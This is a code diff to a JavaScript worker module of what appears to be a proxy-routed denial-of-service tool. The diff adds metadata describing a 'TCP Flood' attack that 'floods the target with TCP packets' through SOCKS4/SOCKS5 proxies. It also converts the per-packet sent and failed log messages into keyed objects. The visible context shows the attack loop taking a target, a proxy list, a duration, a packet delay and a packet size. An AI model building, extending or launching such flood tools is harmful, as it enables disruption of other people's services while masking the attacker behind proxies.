@@ -3,6 +3,13 @@ import { parentPort, workerData } from "worker_threads";
 import { createTcpClient } from "../utils/clientUtils.js";
 import { randomString } from "../utils/randomUtils.js";
 
+export const info = {
+  id: "tcp_flood",
+  name: "TCP Flood",
+  description: "Floods the target with TCP packets.",
+  supportedProtocols: ["socks4", "socks5"],
+};
+
 const startAttack = () => {
   const { target, proxies, duration, packetDelay, packetSize } = workerData;
 
@@ -24,7 +31,13 @@ const startAttack = () => {
       totalPackets++;
 
       parentPort.postMessage({
-        log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+        log: {
+          key: "packet_sent",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+          },
+        },
         totalPackets,
       });
 
@@ -39,7 +52,14 @@ const startAttack = () => {
 
     socket.on("error", (err) => {
       parentPort.postMessage({
-        log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
+        log: {
+          key: "packet_failed",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+            error: err.message,
+          },
+        },
         totalPackets,
       });
     });
